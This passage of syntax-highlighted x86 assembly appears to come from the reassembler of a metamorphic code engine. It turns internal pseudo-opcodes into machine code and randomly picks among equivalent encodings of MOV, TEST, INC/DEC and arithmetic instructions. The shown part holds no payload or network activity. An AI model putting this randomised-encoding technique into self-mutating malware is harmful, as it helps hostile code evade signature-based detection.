                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegImm_Normal_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Set the "use register"</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                     </span><span class="sc1">; flag (the bits 7&amp;6 on</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                  </span><span class="sc1">; the second opcode set to</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; 1)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the immediate and set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">              </span><span class="sc1">; Add the length of the just coded</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                         </span><span class="sc1">; instruction to the EIP</span><span class="sc0">

     </span><span class="sc5">@@Assemble_OPRegReg</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Check if the operation is normal</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegReg_Normal</span><span class="sc0"> </span><span class="sc1">; If it is, jump</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOVRegReg</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TESTRegReg</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; TEST</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">                  </span><span class="sc1">; Opcode of TEST</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TEST8RegReg_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">   </span><span class="sc1">; Select randomly if we use the normal</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; opcode or the inversed one</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OPRegReg_NextFF</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegReg_Inversed_2</span><span class="sc0">

     </span><span class="sc5">@@Assemble_MOVRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">        </span><span class="sc1">; MOV opcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegReg_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Set 32 bits</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OP8RegReg_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">   </span><span class="sc1">; Select if we inverse it</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OPRegReg_Inversed</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegReg_NextFF</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get in ECX the source</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get in EDX the destiny</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegReg_Next00</span><span class="sc0"> </span><span class="sc1">; Jump to complete</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegReg_Inversed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; If inversed, add 2 to the opcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegReg_Inversed_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get in ECX the destiny</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get in EDX the source</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegReg_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Set ECX in bits 5,4,3 and EDX in</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">;  bits 2,1,0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; Activate bits 7&amp;6 to use bits 2,1,0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">;  as a register rather than as a</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;  memory operand.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; Store it and increment the EIP</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_OPRegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                   </span><span class="sc1">; Normal operation?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegMem_Normal</span><span class="sc0">   </span><span class="sc1">; Then jump</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                   </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOVRegMem</span><span class="sc0">         </span><span class="sc1">; Then jump</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TESTRegMem</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; TEST</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">                 </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegMem_Normal_00</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOVRegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">     </span><span class="sc1">; +3 = 8Bh</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegMem_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPRegMem_Normal_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">             </span><span class="sc1">; Mix it with the memory address</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">;  opcode data</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0">  </span><span class="sc1">; Construct the mem. reference</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_OPMemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">           </span><span class="sc1">; Generic operation?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPMemReg_Normal</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">            </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_TESTRegMem</span><span class="sc0"> </span><span class="sc1">; Jump if it's TEST</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOVMemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">           </span><span class="sc1">; Set MOV opcode (+1 = 32 bits op.)</span><span class="sc0">
                </span><span class="sc1">;jmp   @@Assemble_OPRegMem_Normal_00</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OPMemReg_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegMem_Normal_00</span><span class="sc0">

</span><span class="sc1">;;;-------------------------------------------------</span><span class="sc0">

   </span><span class="sc1">; Assembly of INC/DEC Reg</span><span class="sc0">
     </span><span class="sc5">@@Assemble_INCDECReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">      </span><span class="sc1">; Select one codification or other</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; If EAX=0, use INC/DEC Mem opcode</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_INCDECReg_2</span><span class="sc0">   </span><span class="sc1">; forced to register usage</span><span class="sc0">
       </span><span class="sc5">@@Assemble_INCDECReg_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the operation (0=INC, 8=DEC)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">           </span><span class="sc1">; Make it 40h/48h (x86 opcode)</span><span class="sc0">
       </span><span class="sc5">@@Assemble_INCDECReg_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Bind the register to the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; and write it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc5">@@Assemble_INCDECReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; INC/DEC/etc. Mem32 extended opcode</span><span class="sc0">
       </span><span class="sc5">@@Assemble_INCDECReg_2_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Write it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the operation (0 or 8)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">         </span><span class="sc1">; Force it to use registers</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_INCDECReg_Common</span><span class="sc0"> </span><span class="sc1">; Jump to complete it</span><span class="sc0">
     </span><span class="sc5">@@Assemble_INCDECReg_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">          </span><span class="sc1">; INC/DEC/PUSH/etc. Mem8 opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_INCDECReg_2_8b</span><span class="sc0">

     </span><span class="sc5">@@Assemble_INCDECMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; FF = Extended opcode for INC, DEC, etc.</span><span class="sc0">
     </span><span class="sc5">@@Assemble_INCDECMem_2_8b</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; (32 bits)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operation and bind it to the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0"> </span><span class="sc1">; memory operand codification</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                           </span><span class="sc1">; (in 2nd opcode)</span><span class="sc0">
     </span><span class="sc5">@@Assemble_INCDECMem_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">    </span><span class="sc1">; INC/DEC/PUSH/etc. opcode for 8 bits</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_INCDECMem_2_8b</span><span class="sc0">


     </span><span class="sc5">@@Assemble_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">       </span><span class="sc1">; INC/DEC Reg32 pseudoopcode?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_INCDECReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; INC/DEC Reg8 pseudoopcode?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_INCDECReg_8b</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">       </span><span class="sc1">; INC/DEC Mem32 pseudoopcode?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_INCDECMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; INC/DEC Mem8 pseudoopcode?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_INCDECMem_8b</span><span class="sc0">


     </span><span class="sc5">@@Assemble_Next00_</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; Generic 8 bits opcodes </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Assemble_Next01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Assemble_Next01</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Get the type of operation</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; OP Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OP8RegImm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; OP Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OP8RegReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; OP Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OP8RegMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">; OP Mem,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OP8MemReg</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OP8MemImm</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OP8MemImm_Normal</span><span class="sc0"> </span><span class="sc1">; Jump if it's not MOV/TEST</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOV8MemImm</span><span class="sc0">    
     </span><span class="sc5">@@Assemble_TEST8MemImm</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; TEST</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">             </span><span class="sc1">; x86 TEST Mem8,Imm opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPMemImm_Normal_00</span><span class="sc0">  </span><span class="sc1">; Assemble it</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">; Subtract 3 because it added</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                           </span><span class="sc1">; DWORD length, not byte length</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOV8MemImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; The same as with TEST, but with</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc0">          </span><span class="sc1">; the opcode 0C6h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPMemImm_Normal_00</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OP8MemImm_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">             </span><span class="sc1">; Select randomly 80h or 82h (for</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">             </span><span class="sc1">; 8 bits both are the same)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPMemImm_Normal_00</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_OP8RegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">           </span><span class="sc1">; Jump if not MOV/TEST</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OP8RegImm_Normal</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOV8RegImm</span><span class="sc0">
